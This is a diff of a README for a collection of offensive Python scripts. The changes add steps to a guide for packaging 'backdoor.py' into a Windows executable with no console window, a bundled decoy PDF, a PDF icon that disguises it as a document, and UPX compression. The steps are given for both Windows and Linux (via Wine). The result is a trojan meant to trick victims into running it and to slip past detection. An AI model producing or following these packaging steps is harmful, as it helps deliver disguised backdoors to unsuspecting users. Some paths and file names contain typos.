@@ -5,14 +5,18 @@ A Collection of Python Scripts.
 
 ### Windows
 - Install pyinstaller for python: ```python.exe -m pip install pyinstaller```
-- Convert to exe: ```pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;."```
+- Search pdf in [IconFinder](https://www.iconfinder.com/) to create an icon (size:128px & 512*\512) with PNG format
+- Use [Convertor](https://www.zamzar.com/convert/png-to-ico/) to convert PNG to ICO (512\*512) & change the name to pdf.ico
+- Convert to exe: ```pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;." --icon /root/Downlaods/pdf.ico```
 - Use UPX (from github) to compress exe file: ```./upx /root/PycharmProjects/backdoor/dist/backdoor.exe -o compressed_bacdoor.exe```
 
 ### Linux
 - Install python for Windows inside Linux: ```wine msiexec /i python-2.7.14.msi```
 - Install pyinstaller for python: ```wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller```
 - Install all imported library: ```wine /root/.wine/drive_c/Python27/python.exe -m pip install pynput```
-- Convert to exe: ```wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;."```
+- - Search pdf in [IconFinder](https://www.iconfinder.com/) to create an icon (size:128px & 512*\512) with PNG format
+- Use [Convertor](https://www.zamzar.com/convert/png-to-ico/) to convert PNG to ICO (512\*512) & change the name to pdf.ico
+- Convert to exe: ```wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe backdoor.py --onefile --noconsole --add-data "/root/Downloads/sample.pdf;." --icon /root/Downlaods/pdf.ico```
 - Use UPX (from github) to compress exe file: ```./upx /root/PycharmProjects/backdoor/dist/backdoor.exe -o compressed_bacdoor.exe```
 
 ## Usage
